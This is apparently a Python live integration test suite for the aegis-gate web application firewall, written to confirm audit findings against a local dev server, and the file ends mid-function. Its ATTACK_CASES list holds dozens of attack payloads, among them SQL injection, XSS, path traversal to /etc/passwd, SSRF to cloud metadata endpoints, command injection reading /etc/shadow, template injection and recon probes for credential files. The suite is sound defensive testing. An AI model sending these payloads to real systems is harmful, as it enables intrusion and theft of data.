#!/usr/bin/env python3
"""
LT-RUN-6 Live Integration Tests — aegis-gate
=============================================
Requires: make run-dev (http://localhost:8080, http://localhost:9443)

Run:
    python3 tests/lt_run6_live_tests.py

Options:
    --data  <url>   Data plane base URL  (default: http://localhost:8080)
    --admin <url>   Admin base URL       (default: http://localhost:9443)
    --user  <name>  Admin username       (default: admin)
    --pass  <pw>    Admin password       (default: aegis-test-1234)
    --no-tls-verify Skip TLS certificate verification (default: True for https)
    -v / --verbose  Print full response bodies

ASSERTION-INVERSION CONVENTION (LT-RUN-7 TS-04, 2026-05-14)
----------------------------------------------------------
This suite was originally written to **confirm known bugs from
the Run-6 audit** rather than to gate "passing" behaviour.  Each
`R.record(fid, name, passed=BOOL, note)` call uses `passed=True`
when the EXPECTED BUGGY BEHAVIOUR was observed.

Concretely:
  - ✓ in the terminal output means: "the audit was right, the bug
    is still present in this build" (e.g. SEC-07 attack passes
    through with HTTP 200).
  - ✗ in the terminal output means: "the bug appears to be FIXED
    in this build" (e.g. the attack returned HTTP 403).

As fixes land, the suite's ✓ count goes DOWN.  Treat ✗ rows as
the desirable outcome during fix validation.  Once a fix is
permanent the related test should be REWRITTEN to assert the
fixed behaviour as the new pass condition (i.e. flip the
expected boolean).

Tests that are SKIPPED (LT-RUN-7 TS-01, TS-09) reflect findings
that cannot be exercised via HTTP — see the per-test docstrings.

Each test is labelled with its Run-6 finding ID. A ✓ means the expected
(possibly buggy) behaviour was observed; ✗ means it differed from the audit
prediction (which may mean the bug was fixed — check notes).
"""

import argparse
import json
import sys
import time
import urllib.request
import urllib.error
import urllib.parse
import ssl
import http.cookiejar
from dataclasses import dataclass, field
from typing import Optional, Any

# ── colour helpers ──────────────────────────────────────────────────────────
RESET = "\033[0m"; BOLD = "\033[1m"
GREEN = "\033[32m"; RED = "\033[31m"; YELLOW = "\033[33m"; CYAN = "\033[36m"

def ok(msg):  print(f"  {GREEN}✓{RESET} {msg}")
def fail(msg):print(f"  {RED}✗{RESET} {msg}")
def warn(msg):print(f"  {YELLOW}⚠{RESET} {msg}")
def info(msg):print(f"  {CYAN}·{RESET} {msg}")
def hdr(msg): print(f"\n{BOLD}{msg}{RESET}")
def sep():    print("  " + "─"*64)

# ── result tracker ───────────────────────────────────────────────────────────
@dataclass
class Results:
    passed: int = 0
    failed: int = 0
    skipped: int = 0
    findings: dict = field(default_factory=dict)

    def record(self, finding_id, name, passed, note=""):
        self.findings.setdefault(finding_id, []).append((name, passed, note))
        if passed:
            self.passed += 1
            ok(f"[{finding_id}] {name}" + (f"  — {note}" if note else ""))
        else:
            self.failed += 1
            fail(f"[{finding_id}] {name}" + (f"  — {note}" if note else ""))

    def skip(self, finding_id, name, reason=""):
        self.skipped += 1
        warn(f"[{finding_id}] SKIP {name}" + (f"  — {reason}" if reason else ""))

    def summary(self):
        total = self.passed + self.failed
        hdr(f"══ SUMMARY ══  {self.passed}/{total} passed"
            f"  ({self.skipped} skipped)")
        by_finding = {}
        for fid, cases in self.findings.items():
            p = sum(1 for _, ok, _ in cases if ok)
            t = len(cases)
            by_finding[fid] = (p, t)
        for fid in sorted(by_finding):
            p, t = by_finding[fid]
            color = GREEN if p == t else (YELLOW if p > 0 else RED)
            print(f"  {color}{fid:12s}{RESET}  {p}/{t}")
        if self.failed == 0:
            print(f"\n{GREEN}{BOLD}All assertions passed.{RESET}")
        else:
            print(f"\n{RED}{BOLD}{self.failed} assertion(s) failed.{RESET}")

R = Results()

# ── HTTP client ──────────────────────────────────────────────────────────────
class Client:
    def __init__(self, base: str, admin: str, verify_tls: bool, verbose: bool,
                 user: str, password: str):
        self.base = base.rstrip("/")
        self.admin = admin.rstrip("/")
        self.verbose = verbose
        self.user = user
        self.password = password
        self.jar = http.cookiejar.CookieJar()
        ctx = ssl.create_default_context()
        if not verify_tls:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.jar),
            urllib.request.HTTPSHandler(context=ctx),
        )
        self.csrf = None

    def _req(self, url: str, method: str = "GET", body: Any = None,
             headers: Optional[dict] = None, timeout: int = 8) -> tuple[int, bytes, dict]:
        data = None
        req_headers = {"Accept": "application/json"}
        if headers:
            req_headers.update(headers)
        if body is not None:
            if isinstance(body, (dict, list)):
                data = json.dumps(body).encode()
                req_headers["Content-Type"] = "application/json"
            else:
                data = body if isinstance(body, bytes) else str(body).encode()
        req = urllib.request.Request(url, data=data, method=method,
                                     headers=req_headers)
        try:
            with self.opener.open(req, timeout=timeout) as resp:
                raw = resp.read()
                if self.verbose:
                    info(f"  {method} {url}  → {resp.status}")
                    if raw:
                        info(f"  body: {raw[:200]}")
                return resp.status, raw, dict(resp.headers)
        except urllib.error.HTTPError as e:
            raw = e.read()
            if self.verbose:
                info(f"  {method} {url}  → {e.code}")
            return e.code, raw, dict(e.headers)
        except Exception as e:
            if self.verbose:
                info(f"  {method} {url}  → ERROR {e}")
            return 0, b"", {}

    # data plane
    def get(self, path, headers=None):
        return self._req(self.base + path, headers=headers)
    def post(self, path, body=None, headers=None):
        return self._req(self.base + path, "POST", body, headers)

    # admin plane
    def aget(self, path, headers=None):
        h = dict(headers or {})
        if self.csrf:
            h["X-CSRF-Token"] = self.csrf
        return self._req(self.admin + path, headers=h)
    def apost(self, path, body=None, headers=None):
        h = dict(headers or {})
        if self.csrf:
            h["X-CSRF-Token"] = self.csrf
        return self._req(self.admin + path, "POST", body, h)
    def aput(self, path, body=None, headers=None):
        h = dict(headers or {})
        if self.csrf:
            h["X-CSRF-Token"] = self.csrf
        return self._req(self.admin + path, "PUT", body, h)
    def adelete(self, path, headers=None):
        h = dict(headers or {})
        if self.csrf:
            h["X-CSRF-Token"] = self.csrf
        return self._req(self.admin + path, "DELETE", headers=h)

    def login(self) -> bool:
        status, body, hdrs = self._req(
            self.admin + "/admin/login", "POST",
            {"user": self.user, "password": self.password},
        )
        if status != 200:
            return False
        for cookie in self.jar:
            if cookie.name == "aegis_csrf":
                self.csrf = cookie.value
        return True

    def json_body(self, raw: bytes):
        try:
            return json.loads(raw)
        except Exception:
            return None


# ═══════════════════════════════════════════════════════════════════════════════
#  TESTS
# ═══════════════════════════════════════════════════════════════════════════════

def test_server_up(c: Client):
    hdr("0. Server connectivity")
    sep()
    s, _, _ = c.get("/")
    R.record("INFRA", "data plane responds", s in (200, 502, 301, 302),
             f"HTTP {s}")
    s, _, _ = c.aget("/healthz/ready")
    R.record("INFRA", "admin /healthz/ready is 200", s == 200, f"HTTP {s}")
    return s == 200  # if admin down, skip many tests


# ─────────────────────────────────────────────────────────────────────────────
# SEC-07: All 12 detectors disconnected — attack payloads pass through
# ─────────────────────────────────────────────────────────────────────────────
ATTACK_CASES = [
    # (label, path, headers_dict)
    # ── SQL injection ──
    ("SQLi OR bypass",         "/api?id=1'+OR+'1'%3D'1", {}),
    ("SQLi UNION SELECT",      "/api?q=1+UNION+SELECT+NULL--", {}),
    ("SQLi stacked",           "/api?id=1;DROP+TABLE+users--", {}),
    ("SQLi comment strip",     "/api?id=1/**/OR/**/1=1", {}),
    ("SQLi hex encoded",       "/api?id=0x31+OR+0x31%3D0x31", {}),
    ("SQLi time-based",        "/api?id=1;WAITFOR+DELAY+'0:0:5'--", {}),
    ("SQLi error-based",       "/api?id=1+AND+EXTRACTVALUE(1,CONCAT(0x7e,version()))--", {}),
    ("SQLi blind",             "/api?id=1+AND+SLEEP(5)--", {}),
    ("SQLi in cookie",         "/api", {"Cookie": "session=1' OR '1'='1"}),
    ("SQLi in User-Agent",     "/api", {"User-Agent": "sqlmap/1.5#stable"}),
    # ── XSS ──
    ("XSS script tag",         "/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E", {}),
    ("XSS img onerror",        "/search?q=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E", {}),
    ("XSS svg onload",         "/search?q=%3Csvg+onload%3Dalert(1)%3E", {}),
    ("XSS URL javascript",     "/search?q=javascript%3Aalert(1)", {}),
    ("XSS HTML entity bypass", "/search?q=%26lt%3Bscript%26gt%3Balert(1)%26lt%3B%2Fscript%26gt%3B", {}),
    ("XSS data URI",           "/search?q=data%3Atext%2Fhtml%2C%3Cscript%3Ealert(1)%3C%2Fscript%3E", {}),
    ("XSS vbscript",           "/search?q=vbscript%3Amsgbox(1)", {}),
    ("XSS in referer",         "/api", {"Referer": "<script>alert(1)</script>"}),
    # ── Path traversal ──
    ("PathTraversal basic",    "/files?name=../../etc/passwd", {}),
    ("PathTraversal URL enc",  "/files?path=%2E%2E%2F%2E%2E%2Fetc%2Fpasswd", {}),
    ("PathTraversal double",   "/files?path=....//....//etc/passwd", {}),
    ("PathTraversal null byte","/files?name=../../etc/passwd%00.jpg", {}),
    ("PathTraversal Windows",  "/files?path=..\\..\\windows\\system32", {}),
    ("PathTraversal unicode",  "/files?path=%C0%AF%C0%AF%C0%AFetc/passwd", {}),
    # ── SSRF ──
    ("SSRF localhost",         "/proxy?url=http://localhost/admin", {}),
    ("SSRF 127.0.0.1",         "/proxy?url=http://127.0.0.1/secret", {}),
    ("SSRF AWS metadata",      "/proxy?url=http://169.254.169.254/latest/meta-data/", {}),
    ("SSRF GCP metadata",      "/proxy?url=http://metadata.google.internal/", {}),
    ("SSRF IPv6 loopback",     "/proxy?url=http://[::1]/admin", {}),
    ("SSRF file:// protocol",  "/proxy?url=file:///etc/passwd", {}),
    ("SSRF gopher protocol",   "/proxy?url=gopher://evil.com/", {}),
    ("SSRF IPv4-mapped IPv6",  "/proxy?url=http://[::ffff:127.0.0.1]/secret", {}),
    ("SSRF URL userinfo bypass","/proxy?url=https://evil.com:80@internal-svc/path", {}),
    ("SSRF decimal IP",        "/proxy?url=http://2130706433/", {}),  # 127.0.0.1
    ("SSRF hex IP",            "/proxy?url=http://0x7f000001/", {}),
    ("SSRF Alibaba metadata",  "/proxy?url=http://100.100.100.200/", {}),
    # ── Command injection ──
    ("CmdInjection semicolon", "/exec?cmd=ls;cat+/etc/passwd", {}),
    ("CmdInjection pipe",      "/exec?cmd=ls|id", {}),
    ("CmdInjection backtick",  "/exec?cmd=`id`", {}),
    ("CmdInjection $() sub",   "/exec?cmd=$(cat+/etc/shadow)", {}),
    ("CmdInjection &&",        "/exec?cmd=ls&&cat+/etc/passwd", {}),
    # ── Template injection ──
    ("SSTI Jinja2",            "/render?tmpl={{7*7}}", {}),
    ("SSTI Twig",              "/render?tmpl={{_self.env.registerUndefinedFilterCallback(exec)}}", {}),
    ("SSTI FreeMarker",        "/render?tmpl=${7*7}", {}),
    ("SSTI Ruby ERB",          "/render?tmpl=<%%=7*7%%>", {}),
    # ── NoSQL injection ──
    ("NoSQLi $ne operator",    "/api/users?filter[$ne]=1", {}),
    ("NoSQLi $gt operator",    "/api/users?filter[$gt]=", {}),
    ("NoSQLi $regex",          "/api/users?name[$regex]=.*", {}),
    ("NoSQLi $where",          "/api/users?where=function(){return true}", {}),
    # ── Open redirect ──
    ("OpenRedirect //evil.com", "/redirect?to=//evil.com", {}),
    ("OpenRedirect http",       "/redirect?url=http://evil.com", {}),
    ("OpenRedirect \\\\evil",   "/redirect?next=\\\\evil.com", {}),
    # ── Reconnaissance ──
    ("Recon .env file",        "/.env", {}),
    ("Recon .git directory",   "/.git/HEAD", {}),
    ("Recon wp-config",        "/wp-config.php", {}),
    ("Recon phpinfo",          "/phpinfo.php", {}),
    ("Recon docker API",       "/v1.24/containers/json", {}),
    ("Recon spring actuator",  "/actuator/heapdump", {}),
    ("Recon Jenkins script",   "/script", {}),
    ("Recon AWS creds",        "/.aws/credentials", {}),
    ("Recon .htpasswd",        "/.htpasswd", {}),
    ("Recon backup sql",       "/backup.sql", {}),
    ("Recon swagger-ui",       "/swagger-ui.html", {}),
    ("Recon GraphQL introspect","/graphql?query={__schema{types{name}}}", {}),
    ("Recon K8s pods",         "/api/v1/pods", {}),
    ("Recon Kibana",           "/app/kibana", {}),
    ("Recon elastic cat",      "/_cat/indices", {}),
    ("Recon nikto UA",         "/api", {"User-Agent": "Nikto/2.1.6"}),
    ("Recon sqlmap UA",        "/api", {"User-Agent": "sqlmap/1.5"}),
    ("Recon gobuster UA",      "/api", {"User-Agent": "gobuster/3.1"}),
    # ── Header injection ──
    ("HeaderInjection CRLF",   "/api?x=foo%0d%0aSet-Cookie:+evil=1", {}),
    ("HeaderInjection X-Forwarded-Host","/api", {"X-Forwarded-Host": "evil.com"}),
]

def test_sec07_detectors_disconnected(c: Client):
    hdr("SEC-07: Detectors disconnected — attack payloads must return non-block status")
    info("  If detectors WERE wired, these should return 403. Currently they pass through.")
    info("  All ✓ here means SEC-07 is CONFIRMED (bug exists — attacks not blocked).")
    sep()
    blocked = 0
    passed_through = 0
    for label, path, hdrs in ATTACK_CASES:
        s, body, _ = c.get(path, headers=hdrs)
        # 200 or 502 = passed through (upstream may/may not be up)
        # 403 or 406 = detector fired (would mean bug is FIXED)
        if s in (200, 502, 301, 302, 404):
            passed_through += 1
            R.record("SEC-07", f"attack passes through: {label}",
                     True, f"HTTP {s} — not blocked ✓ (confirms SEC-07)")
        elif s in (403, 406, 429):
            blocked += 1
            R.record("SEC-07", f"attack BLOCKED (fix landed?): {label}",
                     False, f"HTTP {s} — attack was blocked! SEC-07 may be fixed")
        else:
            R.record("SEC-07", f"unexpected status: {label}",
                     False, f"HTTP {s}")
    sep()
    info(f"  Passed through: {passed_through}  |  Blocked: {blocked}")
    if blocked == 0:
        warn(f"  SEC-07 CONFIRMED: 0/{len(ATTACK_CASES)} attack payloads blocked")
    else:
        ok(f"  SEC-07 PARTIALLY FIXED: {blocked}/{len(ATTACK_CASES)} attacks now blocked")


# ─────────────────────────────────────────────────────────────────────────────
# SEC-20: on_response_start always PassThrough
# ─────────────────────────────────────────────────────────────────────────────
def test_sec20_response_passthrough(c: Client):
    hdr("SEC-20: on_response_start always PassThrough (ICAP not called)")
    sep()
    # Stack trace and internal IP scrubbing ARE wired via on_body_frame (PR #7 fixed)
    # but on_response_start() itself does nothing.
    # We test by checking response headers — a properly wired ICAP response
    # start would potentially inject scan headers.
    # For now we verify the route is reachable and no ICAP headers appear.
    s, body, resp_headers = c.get("/")
    has_icap_header = any("x-icap" in k.lower() or "x-scan" in k.lower()
                          for k in resp_headers)
    R.record("SEC-20", "on_response_start returns PassThrough (no ICAP headers)",
             not has_icap_header,
             "no x-icap-* headers — confirms ICAP not called")

    # PR #7 fix: on_body_frame DOES scrub. Test with a simulated stack trace.
    # We can only test what the WAF emits — if upstream is up, body scrubbing
    # would apply to upstream responses. We test by checking the proxy works.
    R.record("SEC-20", "data plane is reachable (response path active)",
             s in (200, 502), f"HTTP {s}")


# ─────────────────────────────────────────────────────────────────────────────
# EVAL-01: CIDR IpIn bug — via rule creation and testing
# ─────────────────────────────────────────────────────────────────────────────
def test_eval01_cidr_ipin(c: Client):
    hdr("EVAL-01: Condition::IpIn CIDR prefix-match bug")
    sep()

    # Create a rule that blocks 127.0.0.0/8 (loopback)
    rule_id = "lt-run6-eval01-cidr-test"
    rule = {
        "id": rule_id,
        "priority": 1,
        "enabled": True,
        "description": "LT-RUN-6 CIDR test — should block loopback subnet",
        "when": {"ip_in": ["127.0.0.0/8"]},
        "then": {"block": {"status": 403}},
    }

    # Try to create the rule
    s, body, _ = c.apost("/api/rules", rule)
    if s not in (200, 201, 204):
        R.skip("EVAL-01", "rule creation failed — skip CIDR test",
               f"POST /api/rules → HTTP {s}: {body[:200]}")
        return

    info("  Rule created. Testing against 127.0.0.1 (loopback — should be in 127.0.0.0/8)...")
    time.sleep(0.3)

    # The request comes FROM our client (127.0.0.1 since we're localhost).
    # The rule should match 127.0.0.1 if CIDR is working.
    s, body, _ = c.get("/")
    if s == 403:
        R.record("EVAL-01", "CIDR 127.0.0.0/8 matches 127.0.0.1 (bug FIXED)",
                 False, "HTTP 403 — CIDR now working! EVAL-01 may be fixed")
    elif s in (200, 502):
        R.record("EVAL-01", "CIDR 127.0.0.0/8 does NOT match 127.0.0.1 (bug confirmed)",
                 True, f"HTTP {s} — string prefix '127.0.0.1'.starts_with('127.0.0.0') = false")
    else:
        R.record("EVAL-01", "unexpected status from CIDR rule test",
                 False, f"HTTP {s}")

    # Cleanup
    c.adelete(f"/api/rules/{rule_id}")
    time.sleep(0.2)

    # Additional: test that an EXACT ip match DOES work (to confirm rule eval is running)
    rule_exact = {
        "id": rule_id + "-exact",
        "priority": 1,
        "enabled": True,
        "description": "LT-RUN-6 exact IP test",
        "when": {"ip_in": ["127.0.0.1"]},  # exact IP without mask
        "then": {"block": {"status": 403}},
    }
    s2, _, _ = c.apost("/api/rules", rule_exact)
    if s2 in (200, 201, 204):
        time.sleep(0.3)
        s3, _, _ = c.get("/")
        if s3 == 403:
            R.record("EVAL-01", "exact IP match 127.0.0.1 DOES block",
                     True, "HTTP 403 — exact match works, only CIDR is broken")
        else:
            R.record("EVAL-01", "exact IP 127.0.0.1 block rule did not fire",
                     False, f"HTTP {s3} — rules may not be evaluating at all")
        c.adelete(f"/api/rules/{rule_id}-exact")


# ─────────────────────────────────────────────────────────────────────────────
# EVAL-02: RateLimit rule fires on first request
# ─────────────────────────────────────────────────────────────────────────────
def test_eval02_ratelimit_no_backend(c: Client):
    hdr("EVAL-02: RuleAction::RateLimit ignores key/limit — fires on request #1")
    sep()

    rule_id = "lt-run6-eval02-ratelimit-test"
    rule = {
        "id": rule_id,
        "priority": 1,
        "enabled": True,
        "description": "LT-RUN-6 RateLimit bug test — limit=10000 should allow many requests",
        "when": {"path_matches": {"prefix": "/lt-run6-rl-test"}},
        "then": {"rate_limit": {"key": "ip", "limit": 10000, "window_s": 60}},
    }
    s, body, _ = c.apost("/api/rules", rule)
    if s not in (200, 201, 204):
        R.skip("EVAL-02", "rule creation failed", f"HTTP {s}: {body[:200]}")
        return

    info("  Rule created: limit=10000, window=60s. Sending first request...")
    time.sleep(0.3)

    s1, b1, _ = c.get("/lt-run6-rl-test/endpoint")
    if s1 == 429:
        R.record("EVAL-02", "rate_limit fires on request #1 (limit=10000 irrelevant)",
                 True,
                 "HTTP 429 on 1st req — confirms state backend never consulted")
    elif s1 in (200, 502):
        R.record("EVAL-02", "rate_limit does NOT fire on first request (bug fixed?)",
                 False,
                 f"HTTP {s1} — RateLimit rule respects limit (EVAL-02 may be fixed)")
    else:
        R.record("EVAL-02", "unexpected status from rate_limit rule",
                 False, f"HTTP {s1}")

    # Verify retry-after header is present on 429
    if s1 == 429:
        s2, _, h2 = c.get("/lt-run6-rl-test/endpoint")
        has_retry = "retry-after" in {k.lower() for k in h2}
        R.record("EVAL-02", "429 response carries Retry-After header",
                 has_retry, str({k: v for k, v in h2.items() if "retry" in k.lower()}))

    # Also test: a BLOCK rule on the same path should work (ensures rule eval runs at all)
    rule_block = {
        "id": rule_id + "-block",
        "priority": 2,
        "enabled": True,
        "description": "LT-RUN-6 block sanity check",
        "when": {"path_matches": {"prefix": "/lt-run6-block-sanity"}},
        "then": {"block": {"status": 403}},
    }
    s3, _, _ = c.apost("/api/rules", rule_block)
    if s3 in (200, 201, 204):
        time.sleep(0.2)
        s4, _, _ = c.get("/lt-run6-block-sanity/test")
        R.record("EVAL-02", "block rule fires correctly (rule eval is active)",
                 s4 == 403, f"HTTP {s4}")
        c.adelete(f"/api/rules/{rule_id}-block")

    c.adelete(f"/api/rules/{rule_id}")


# ─────────────────────────────────────────────────────────────────────────────
# Admin API health / shape tests
# ─────────────────────────────────────────────────────────────────────────────
def test_admin_api(c: Client):
    hdr("Admin API: shape and availability checks")
    sep()

    endpoints = [
        ("/api/about",       "about"),
        ("/api/runtime",     "runtime info"),
        ("/api/stats",       "stats"),
        ("/api/rules",       "rules list"),
        ("/api/detectors",   "detector config"),
        ("/api/blacklist",   "blacklist"),
        ("/api/whitelist",   "whitelist"),
        ("/api/routes",      "routes"),
        ("/api/upstreams",   "upstreams"),
        ("/api/risk",        "risk overview — may 404 if no tracked IPs"),
        ("/api/mode",        "operating mode"),
    ]
    for path, label in endpoints:
        s, body, _ = c.aget(path)
        R.record("ADMIN-API", f"GET {path} ({label})",
                 s in (200, 404),  # 404 is ok for empty risk table
                 f"HTTP {s}")


# ─────────────────────────────────────────────────────────────────────────────
# Detector toggle tests
# ─────────────────────────────────────────────────────────────────────────────
def test_detector_toggles(c: Client):
    hdr("Detector config: toggle individual detectors")
    sep()

    s, body, _ = c.aget("/api/detectors")
    if s != 200:
        R.skip("DETECTORS", "GET /api/detectors failed", f"HTTP {s}")
        return

    j = c.json_body(body)
    if not j:
        R.skip("DETECTORS", "response is not JSON", "")
        return
    R.record("DETECTORS", "GET /api/detectors returns JSON", True, "")

    # Try toggling sqli off then back on
    disable_payload = {"sqli": {"enabled": False}}
    s2, _, _ = c.aput("/api/detectors", disable_payload)
    R.record("DETECTORS", "PUT /api/detectors disable sqli", s2 in (200, 204),
             f"HTTP {s2}")

    if s2 in (200, 204):
        # Confirm sqli is now OFF — sqli payload should still pass through
        s3, _, _ = c.get("/api?q=1'+OR+'1'%3D'1")
        R.record("DETECTORS", "sqli payload passes through when sqli disabled",
                 s3 in (200, 502), f"HTTP {s3}")

        # Re-enable
        enable_payload = {"sqli": {"enabled": True}}
        s4, _, _ = c.aput("/api/detectors", enable_payload)
        R.record("DETECTORS", "PUT /api/detectors re-enable sqli",
                 s4 in (200, 204), f"HTTP {s4}")


# ─────────────────────────────────────────────────────────────────────────────
# Response filter: on_body_frame scrubbing (PR #7 fix verification)
# ─────────────────────────────────────────────────────────────────────────────
def test_body_scrubbing(c: Client):
    hdr("Body filter: stack trace + IP scrubbing (PR #7 — should be FIXED)")
    sep()
    # This is hard to test without controlling upstream response.
    # We can verify the pipeline is reachable and check for x-waf-* headers
    # which indicate the response pipeline ran.
    s, body, resp_headers = c.get("/health")
    waf_headers = {k: v for k, v in resp_headers.items() if "waf" in k.lower() or "x-content" in k.lower()}
    R.record("BODY-FILTER", "response path is active (200 or 502)",
             s in (200, 502, 404), f"HTTP {s}")
    # Check security headers injected by response_filter.inject_security_headers()
    has_xcto = "x-content-type-options" in {k.lower() for k in resp_headers}
    has_xframe = "x-frame-options" in {k.lower() for k in resp_headers}
    R.record("BODY-FILTER", "X-Content-Type-Options injected by response filter",
             has_xcto, str({k: v for k, v in resp_headers.items()
                            if "content-type-opt" in k.lower()}))
    R.record("BODY-FILTER", "X-Frame-Options injected by response filter",
             has_xframe, str({k: v for k, v in resp_headers.items()
                              if "frame" in k.lower()}))


# ─────────────────────────────────────────────────────────────────────────────
# Noop pipeline check: verify main.rs wires real pipeline, not Noop (CTL-26)
# ─────────────────────────────────────────────────────────────────────────────
def test_noop_pipeline(c: Client):
    hdr("CTL-26 / NOOP: Verify real pipeline is active (not NoopSecurityPipeline)")
    sep()
    # If Noop is wired, the pipeline produces no audit events for attack requests.
    # We can probe /api/audit/since to see if events are being emitted.
    # First send a clearly detectable request.
    c.get("/.env")  # recon
    time.sleep(0.5)

    s, body, _ = c.aget("/api/audit/since?since=0&limit=5")
    if s != 200:
        R.skip("CTL-26", "GET /api/audit/since failed", f"HTTP {s}")
        return
    j = c.json_body(body)
    has_events = bool(j) and (isinstance(j, list) and len(j) > 0
                              or isinstance(j, dict) and j.get("events"))
    R.record("CTL-26", "audit events are being emitted (pipeline is active)",
             has_events, f"events={len(j) if isinstance(j, list) else j}")


# ─────────────────────────────────────────────────────────────────────────────
# Blacklist / whitelist CIDR (EVAL-01 related: admin IP list uses correct matching)
# ─────────────────────────────────────────────────────────────────────────────
def test_blacklist_cidr(c: Client):
    hdr("Admin blacklist: CIDR matching behaviour")
    sep()

    # Add a CIDR to blacklist that should contain 127.0.0.1
    s, _, _ = c.apost("/api/blacklist", {"cidr": "127.0.0.0/8"})
    if s not in (200, 201, 204):
        R.skip("BLACKLIST", "POST /api/blacklist failed", f"HTTP {s}")
        return

    time.sleep(0.3)
    s2, body, _ = c.get("/api/ping")
    if s2 == 403:
        R.record("BLACKLIST", "admin blacklist CIDR correctly matches subnet hosts",
                 True, "HTTP 403 — blacklist CIDR works (different code path from rules IpIn)")
    elif s2 in (200, 502):
        R.record("BLACKLIST", "admin blacklist CIDR does NOT match subnet",
                 False, f"HTTP {s2} — blacklist CIDR may also have EVAL-01-style bug")
    else:
        R.record("BLACKLIST", f"unexpected status from blacklisted IP", False, f"HTTP {s2}")

    # Cleanup — remove the CIDR
    s3, _, _ = c.adelete("/api/blacklist?cidr=127.0.0.0/8")
    R.record("BLACKLIST", "cleanup: remove blacklist entry", s3 in (200, 204), f"HTTP {s3}")
    time.sleep(0.2)


# ─────────────────────────────────────────────────────────────────────────────
# DDoS gate: observe_only and config toggle
# ─────────────────────────────────────────────────────────────────────────────
def test_ddos_gate(c: Client):
    hdr("DDoS: gate config and observe-only mode (DDOS-01)")
    sep()

    s, body, _ = c.aget("/api/gates/ddos")
    if s not in (200, 404):
        R.skip("DDOS-01", "GET /api/gates/ddos not available", f"HTTP {s}")
        return

    if s == 200:
        j = c.json_body(body)
        R.record("DDOS-01", "DDoS gate config is readable", bool(j), str(j)[:100])
        if j:
            observe_only = j.get("observe_only", "unknown")
            enabled = j.get("enabled", "unknown")
            R.record("DDOS-01", "DDoS enabled flag readable",
                     enabled != "unknown", f"enabled={enabled}")
            R.record("DDOS-01", "DDoS observe_only mode is accessible",
                     observe_only != "unknown", f"observe_only={observe_only}")
    else:
        R.skip("DDOS-01", "DDoS gate API returns 404 — endpoint not wired", "")


# ─────────────────────────────────────────────────────────────────────────────
# Risk scoring: verify risk API exists and returns meaningful data
# ─────────────────────────────────────────────────────────────────────────────
def test_risk_api(c: Client):
    hdr("Risk scoring: API shape and tracker exposure (RISK-01)")
    sep()

    s, body, _ = c.aget("/api/risk")
    if s == 200:
        j = c.json_body(body)
        R.record("RISK-01", "GET /api/risk returns 200", True, f"{str(body[:80])}")
    elif s == 404:
        R.record("RISK-01", "GET /api/risk returns 404 (no tracked IPs)", True, "empty risk table")
    else:
        R.record("RISK-01", "GET /api/risk unexpected status", False, f"HTTP {s}")

    s2, body2, _ = c.aget("/api/risk/thresholds")
    R.record("RISK-01", "GET /api/risk/thresholds is accessible",
             s2 == 200, f"HTTP {s2} — {body2[:80] if body2 else ''}")


# ─────────────────────────────────────────────────────────────────────────────
# Whitelist: verify clean IPs are not affected by attack detection (or lack of)
# ─────────────────────────────────────────────────────────────────────────────
def test_whitelist(c: Client):
    hdr("Whitelist: whitelisted IPs bypass blocking")
    sep()

    # Add our source IP to whitelist
    s, _, _ = c.apost("/api/whitelist", {"cidr": "127.0.0.1/32"})
    if s not in (200, 201, 204):
        R.skip("WHITELIST", "POST /api/whitelist failed", f"HTTP {s}")
        return

    time.sleep(0.2)
    # Now an attack payload from whitelisted IP should pass even if detectors run
    s2, _, _ = c.get("/api?id=1'+OR+'1'%3D'1")
    R.record("WHITELIST", "whitelisted IP passes through attack payload",
             s2 in (200, 502), f"HTTP {s2}")

    # Cleanup
    c.adelete("/api/whitelist?cidr=127.0.0.1/32")
    time.sleep(0.2)


# ─────────────────────────────────────────────────────────────────────────────
# Challenge: PoW challenge endpoint availability
# ─────────────────────────────────────────────────────────────────────────────
def test_pow_challenge(c: Client):
    hdr("PoW challenge endpoint: /__waf_control/challenge_issue")
    sep()

    s, body, _ = c.get("/__waf_control/challenge_issue")
    if s == 200:
        j = c.json_body(body)
        R.record("POW", "challenge_issue returns 200 + JSON body", bool(j), str(j)[:100])
        if j:
            has_nonce = "nonce" in j
            has_difficulty = "difficulty" in j
            has_expires = "expires_at_ms" in j
            has_mac = "mac" in j
            R.record("POW", "challenge has nonce field", has_nonce, "")
            R.record("POW", "challenge has difficulty field", has_difficulty,
                     str(j.get("difficulty")))
            R.record("POW", "challenge has expires_at_ms field", has_expires, "")
            R.record("POW", "challenge has mac field", has_mac,
                     "MAC length: " + str(len(j.get("mac", ""))))
    elif s == 404:
        R.skip("POW", "/__waf_control/challenge_issue not exposed (may require challenge mode)", "")
    else:
        R.record("POW", "challenge_issue status", False, f"HTTP {s}")


# ─────────────────────────────────────────────────────────────────────────────
# Threat intel API
# ─────────────────────────────────────────────────────────────────────────────
def test_threat_intel_api(c: Client):
    hdr("Threat Intel API: domain and CIDR intel (THREAT-01)")
    sep()

    # Check if there's a threat intel API
    s, body, _ = c.aget("/api/threat-intel")
    if s == 404:
        # Try alternative paths
        s2, _, _ = c.aget("/api/threat_intel")
        if s2 == 404:
            R.skip("THREAT-01", "no /api/threat-intel or /api/threat_intel endpoint", "")
            return
        s = s2

    R.record("THREAT-01", "threat intel API endpoint exists", s in (200, 204), f"HTTP {s}")


# ─────────────────────────────────────────────────────────────────────────────
# Interop contract headers (v2.3 §5)
# ─────────────────────────────────────────────────────────────────────────────
def test_interop_headers(c: Client):
    hdr("Interop contract: v2.3 response headers")
    sep()

    s, body, headers = c.get("/")
    lc = {k.lower(): v for k, v in headers.items()}

    # v2.3 §5 — required observability headers
    req_id = lc.get("x-request-id", "")
    waf_action = lc.get("x-waf-action", "")
    waf_risk = lc.get("x-waf-risk-score", "")

    R.record("CONTRACT", "x-request-id header present",
             bool(req_id), req_id or "missing")
    R.record("CONTRACT", "x-waf-action header present",
             bool(waf_action), waf_action or "missing")
    R.record("CONTRACT", "x-waf-risk-score header present",
             bool(waf_risk), waf_risk or "missing")


# ─────────────────────────────────────────────────────────────────────────────
# Operating mode API
# ─────────────────────────────────────────────────────────────────────────────
def test_mode_api(c: Client):
    hdr("Operating mode API: read and validate")
    sep()

    s, body, _ = c.aget("/api/mode")
    if s != 200:
        R.skip("MODE", "GET /api/mode failed", f"HTTP {s}")
        return
    j = c.json_body(body)
    R.record("MODE", "GET /api/mode returns JSON", bool(j), str(j)[:100])
    if j:
